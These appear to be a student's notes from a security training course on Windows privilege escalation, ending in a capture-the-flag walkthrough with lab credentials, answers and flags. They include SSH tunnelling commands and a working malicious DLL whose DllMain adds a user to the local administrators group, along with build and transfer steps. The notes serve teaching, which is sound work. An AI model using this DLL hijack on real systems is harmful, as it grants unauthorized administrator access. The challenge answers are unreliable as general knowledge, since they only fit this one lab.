## CCTC Security Day 10
- agenda

## Admin Data 

### CTFd info FOR UPDATED CTF
| Field | Value | 
|-|-|
| Stack # | 10 | 
| Username | JAMO-005-B |  
| Password | YdY8vrRGOsRfhy6 |
| lin.internet | 10.50.21.133 |
|Linux ops | 192.168.65.20, 10.50.27.132|
| Windos Ops | 1192.168.65.10, 10.50.26.107|

### Windows Privilege Escalation, Persistence, and Covering Tracks

- Modes and levels
    - Kernel mode vs User mode
    - Priviledged vs Unpriviledged 

- Access Tokens: Security Identifier (SID) associations and Token associations

- Security Descriptors:
        - DACL (folder permissions), SACL, ACEs

- DLL Search Order (Executabls check the following locations):
    - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

    - The directory the the Application was run from

    - The directory specified in in the C+ function GetSystemDirectory()

    - The directory specified in the C+ function GetWindowsDirectory()

    - The current directory

- Windows Integrity Mechanism (Integrity levels)

    - Untrusted - Anonymous SID access tokens

    - Low - Everyone SID access token (World)

    - Medium - Authenticated Users

    - High - Administrators

    - System - System services (LocalSystem, LocalService, NetworkService)

- User Account Control (UAC)

    - Always notify
    - Notify me only when programs try to make changes to my computer

    - Notify me only when programs try to make changes to my computer (do not dim my desktop)

    - Never notify

- SCHEDULED TASKS & SERVICES

    - Items to evaluate include:

        - Write Permissions

        - Non-Standard Locations

        - Unquoted Executable Paths

        - Vulnerabilities in Executables

        - Permissions to Run As SYSTEM

    - steps to exploit this (find service we can attack, look for something not in system location [no windows stuff], find it has no descirptions, then it's permissions to see if we can write to it)
        1. open up services, sort by description for empty description. We are looking for a service with writing privleges and no descriptions. right click on the service and look for the path to executables
        2. check permissions on windows: go t folder, right click, properties, security tab, and click through grops to see who can do what. 
        3. run icacls in powershell to see permissions: `icacls *executable*`
        4. services --> find executabel path --> saw could place your own there --> move the executable over (scp it over) --> restart the computessh-keygen -f "/home/student/.ssh/known_hosts" -R "[localhost]:41100"
r so the service runs
    
find putty.exe

    1. go into task scheduler --> see what looks abnormal (test_app). Click on it --> click on actions tab --> that should show you what it is running and it's file path.
    
HOW TO HIJACK PUTTY

    1. windows key --> procmon (run as admin)

    2. click 4 squares, run putty, then click 4 squares again --> filter 

    3. Filters: process name is putty.exe, result contains NAME NOT FOUND, Path contains.dll

    ```
    sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-i686-dev mingw-w64-tools mingw-w64-tools mingw-w64-x86-64-dev -y

    i686-w64-mingw32-g++ -c bad.c -o bad.o

    i686-w64-mingw32-g++ -shared -o bad.dll bad.o -Wl,--out-implib,bad.a
    ```


    YOU WILL FIND A SOURCE CODE FILE SAYING THERE IS SOMEHERE THAT CAN BE EXECUTED. 


- BE SURE TO CHECK THESE TEGISTRY KEYS
    - HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
        - Run and RunOnce
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\``
        - Run and RunOnce

- Audit Logging (need to be admin to run it)

    - shows all audit category setting
        - `auditpol /get /category:*`
    - What does the below command show?
        - `auditpol /get /category:* | findstr /i "success failure"`

- Microsoft Event IDs

    - 4624/4625 successful/failed login

    -  4720 account created

    - 4672 administrator equivalent user logs on

    - 7045 Service creation

things with empty descriptions, things we have permissions to, 


***
Order of challenges: on comrade, there is a syslog file in their home directory. Use this for all the windows event log things. --> 
***
### CTF Challenges
Donovian Windows Privilege Escalation (DWP)
XX Jan 2027
Start Time: 1300
Duration: 4 hours
dr horton augustaternal network, gain privileged access to discovered Windows host.

Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty

Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.

Scheme of Maneuver:
>internet_grey_host
->Pivot: 192.168.28.105
-->T1: 192.168.28.5

Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: donovian-windows-private
IP: 192.168.28.5
OS: Windows ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: 3389
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.


***
***
## START GETTING INTO WINDOWS BOX starting from lin-ops

1. `ssh 10.50.21.133 -L 41100:192.168.28.105:2222 -NT`
2. `ssh -p 41100 comrade@localhost -L 42200:192.168.28.5:3389 -NT`
3. `freerdp /v:localhost:42200 /u:comrade /p:StudentPrivPassword /size:1000x1000 +clipboard`

### Challenges

1. WIndows Event Log 1

What service is causing a error level log inside the System log file located under your currently logged in user's directory.

    1. File explorer --> Users--> comrade --> open system --> filter for error 
    2. Fortnite

2. Windows Event Log 2

Using the same "system.evtx" log, what was the date the offending service was first created? Provide answer in the following format: YYYY-MM-DD

    1. look through the dates --> 2019-05-31

3. Windows Event Log 3

Is this a legitmate service?

    1. N

4. Windows Event Log 4

Using the same "system.evtx" log, The system time has changed, what is the new year?

    1. Get rid of all filters, then sort by date and time --> 2230

5. Priv - Vuln 1

Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name.

    1. Open services --> sort by description --> MemoryStatus

6. Priv - DLLs

What is the name of the DLL that is supposed to be loaded, by the vulnerable service?

    1. follow filepath of memory status
    2. Open *.c file in wordpad
    3. search for dll --> hijackmeplz

7.

        1. edit bad.c to create admin rights for comrade
        ```
        #include <windows.h>

int execCommand()
{
 WinExec("cmd /C net localgroup administrators comrade /add", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 execCommand();
 return 0;
}

```
2. make dll
i686-w64-mingw32-g++ -c bad.c -o bad.o

i686-w64-mingw32-g++ -shared -o hijackmeplz.dll bad.o -Wl,--out-implib,bad.a

3. open webserver on lin-ops to pull dll onto windows machine

python -m SimpleHTTPServer 8000

4. pull it down and run it on windows

5. restart and open --> zdZZstAKFrzck126MD2H

